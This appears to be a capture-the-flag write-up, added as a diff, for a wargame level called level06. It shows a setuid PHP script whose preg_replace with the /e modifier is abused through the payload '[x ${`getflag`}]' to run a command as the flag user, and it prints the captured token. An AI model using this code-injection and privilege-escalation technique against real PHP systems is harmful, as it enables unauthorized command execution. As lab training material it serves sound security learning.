@@ -1,0 +1,65 @@
+ll
+|
+L-> -rwsr-x---+ 1 flag06 [...] level06
+L-> -rwxr-x---  1 flag06 [...] level06.php
+
+here we also get 2 flag06's file, and the level06 script is launched as flag06, perfect !
+
+let's try the script
+
+./level06
+|
+L-> PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+so it execute the php code in level06.php and it says that filename cannot be empty, let's try wit an arg
+
+./level06 level06.php
+|
+L-> !/usr/bin/php
+L-> [...]
+
+bingo it take a file in arg and  cat it 5 time ?
+
+let's take a look into this php file
+
+cat level06.php
+|
+v
+
+#!/usr/bin/php
+<?php
+    function y($m) { 
+        $m = preg_replace("/\./", " x ", $m); 
+        $m = preg_replace("/@/", " y", $m); return $m;
+    }
+    function x($y, $z) { 
+        $a = file_get_contents($y);
+        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+        $a = preg_replace("/\[/", "(", $a);
+        $a = preg_replace("/\]/", ")", $a);
+        return $a; 
+    }
+    $r = x($argv[1], $argv[2]);
+    print $r;
+?>
+
+l(36) we get the content of a file so we can assume that ./level06 execute this php code
+we see a lot of preg_replace wich seem like using regex 
+so i search if there was so exploit with regex in php and i foud this: http://www.madirish.net/402
+
+the /e flag in regex allow a callback, so it seems like we can execute some code inside the preg_replace
+according to the source the regex is not jus (.*)/e but [x (.)]/e so our exploit need to be [x exploit]
+remember the suid exploit, the script will be launch as flag06 so we just need a getflag^
+
+
+let's try this
+
+echo '[x ${`getflag`}]' > /tmp/exploit
+
+./level06 /tmp/exploit
+|
+L-> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+L-> in /home/user/level06/level06.php(4) : regexp code on line 1
+
+
+here we go !
